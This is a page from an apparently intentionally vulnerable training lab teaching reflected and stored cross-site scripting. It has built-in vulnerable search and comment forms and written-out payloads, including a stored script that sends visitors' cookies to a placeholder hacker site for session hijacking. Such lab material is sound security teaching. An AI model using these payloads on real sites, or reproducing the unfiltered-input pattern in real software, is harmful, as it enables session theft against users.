	   
	<!-- Main jumbotron for a primary marketing message or call to action -->
	<div class="jumbotron">
	    <div class="container">
	        <h2>
				<a href="http://en.wikipedia.org/wiki/Cross-site_scripting" target='_blank' title="XSS on Wikipedia">
					Cross-Site Scripting (XSS) Attacks
				</a>
			</h2>
	        <p>Caused when raw, unfiltered data entered by the user is displayed in the browser.<br />
	           If that sounds similar to an SQL Injection attack, it is.  XSS is Scipt Injection.
	        </p>
	    </div>
	</div>
	
	<div class="container">
		<div class="panel-group" id="accordion">
			<div class="panel panel-default">
				<div class="panel-heading">
					<h3 class="panel-title"><a data-toggle="collapse" data-parent="#accordion" href="#collapseOne">A Simple, Non-persistent XSS Attack</a></h3>
				</div>
				<div id="collapseOne" class="panel-collapse collapse in">
					<div class="panel-body">
						<div class="panel panel-default medium pull-right">
							<div class="panel-body">
								<form role="search">
								    <div class="form-group">
								      <input name="search" type="text" class="form-control" placeholder="Search">
								    </div>
								    <button type="button" class="btn btn-primary search">Search</button>
							 	</form>
							 	<div id="search-results">
							 		
							 	</div>
							 </div>
						</div>
						<p>Non-persistent attacks are "one-offs" - a script is injected on a page as a user view it.
						   The scipt is not stored on the site, and must be injected at the point of use.
					    </p>
						<p>Here's how it works:</p>
						<ol>
							<li>A script can be injected via a form or URL parameter - any user-supplied data that is displayed on screen is subject to attack if not filtered properly.</li>
							<li>Here we will perform a very simply attack on ourselves to demonstrate:
								<ul>
									<li>In the Search form on this page, enter a search term to see your results (well, it doesn't actually show results, but it does display the terms you searched for...)</li> 
								    <li> Now, enter the following:<br />
									     <code>test&lt;script&gt;alert('Attacked!');&lt;/script&gt;</code>
									</li>
									<li>Press "Search" - when the search is displayed, notice the "script" part doesn't appear - that's because the browser has interpeted it and executed the code within.</li>
								</ul>
							</li>
							<li>This attack is just a bit annoying - but now that we can run code in the browser, what mischief might we get up to?</li>
						</ol>
						<h4>Exercise</h4>
						<p>See if you can inject a script on this page to do something else interesting.<br />
							<small>Hint: all scripts are contained within a pair of &lt;script&gt; &lt;/script&gt; tags.
							</small>
						</p>
					</div>
				</div>
			</div>
			<div class="panel panel-default">
				<div class="panel-heading">
					<h3 class="panel-title"><a data-toggle="collapse" data-parent="#accordion" href="#collapseTwo">Delivering a Non-Persistent XSS Attack</a></h3>
				</div>
				<div id="collapseTwo" class="panel-collapse collapse">
					<div class="panel-body">
						<div class="panel panel-default medium pull-right">
							<div class="panel-body">
							 	<div id="url-search-results">
							 		
							 	</div>
							 </div>
						</div>
						<p>
							Non-persistent XSS attacks often exploit a vulnerable URL parameter whose value is displayed on the page.
							The attacker creates a carefully crafted URL that injects a script onto the page, as we did above using a form.
					    </p>
						<p>Here's how it works:</p>
						<ol>
							<li>This page has a XSS vulnerable parameter called <strong>search</strong> - the value of which is displayed to the right.<br />
						        <strong><a href="<?php echo rewriteURL(XSS_ATTACK); echo urlParam('search=some search terms'); ?>">Try it!</a></strong><br />
						        This link adds a search parameter to the URL - notice how this allow a set of search terms to be passed to the page by any link - a very common technique because it is very handy!
							</li>
							<li>For the "payload" we will reveal the user's PHPSESSID, which we know can be used to hijack their session.</li>
							<li>Here is the script we want to deliver:<br />
								<code>
									&lt;script&gt;document.write('Watch your cookies: ' + document.cookie);&lt;/script&gt;
								</code>
							</li>
							<li>Finally, we'll craft a link that injects this script onto this page using the search URL parameter:<br />
								<strong>
						            <a href="<?php echo rewriteURL(XSS_ATTACK); echo urlParam("search=<script>document.write('Watch your cookies: ' + document.cookie);</script>"); ?>">Click Me!!</a>
								</strong>
							</li>
							<li>This link would be posted on some other website, or sent to a user by e-mail - when the user clicks on the link, the attack is launched!</li>
							<li>This attack starts to reveal just how dangerous a XSS attack can be - if an attacker can run a program in your browser, they can learn all kinds of information!</li>
						</ol>
						<h4>Exercise</h4>
						<p>Can you craft a URL that injects a script on this page? Send the link to a classmate and ask them to click on it.
						</p>
					</div>
				</div>
			</div>
			<div class="panel panel-default">
				<div class="panel-heading">
					<h3 class="panel-title"><a data-toggle="collapse" data-parent="#accordion" href="#collapseThree">Persistent XSS Attack</a></h3>
				</div>
				<div id="collapseThree" class="panel-collapse collapse">
					<div class="panel-body">
						<div class="panel panel-default medium pull-right">
							<div class="panel-body">
								<form role="comment" method="post" action="<?php echo rewriteURL(COMMENT) ?>">
								    <div class="form-group">
								      <textarea name="comment" class="form-control" placeholder="Leave us a Comment"></textarea>
								    </div>
								    <button type="submit" class="btn btn-primary search">Submit</button>
							 	</form>
							 	<div id="view-comments">
							 		<a href='<?php echo rewriteURL(COMMENT_BOARD) ?>'>View All Comments</a>
							 	</div>
							 </div>
						</div>
						<p>
							Notice that the script injections above affect only a single user and are temporary in nature.<br />
							A <em>persistent</em> XSS attack is created when the script is saved in the site's DB and injected every time that DB record is displayed.
					    </p>
						<p>Here's how it works:</p>
						<ol>
							<li>The vulnerability is created by a form that saves unfiltered user input to the site's DB.<br />
								The "comment" form to the right is exactly such a vulnerable form - the comments are saved in the site's DB and then displayed to other users.
								Give it a try: add a comment, then click on View Comments to see all the comments on the site.
							</li>
							<li>Next, we craft an insidious script that does something malicious.  To demonstrate how bad this can get, every time a user views the comments,
								our little script will send their cookies to be saved on a hackers website where someone can use the session keys to hijack their sessions.
							</li>
							<li>Here is just such a script:<br />
								<code>
									&lt;script&gt; window.open("<?php echo rewriteURL(HACKER_SITE); echo urlParam('c='); ?>"+escape(document.cookie)); &lt;/script&gt;					
								</code>
							</li>
							<li>Finally, submit the script code on the vulnerable form. Voila - our XSS is now persistently injected on the Comment listing page.<br />
								Now anytime anyone goes to View Comments, our little script will execute and send their session key to the hacker site.<br />
								<strong>Try it!</strong>
							</li>
						</ol>
						<h4>Try it yourself!</h4>
						<p>Add another persistent XSS of your own design. Doesn't have to do anything terrible - just take some action when the comments are viewed.
						   Because the comments are displayed in reverse-chronological order, your script will execute first, before the hack we made above.
						</p>
					</div>
				</div>
			</div>
				
	     </div>
	</div>
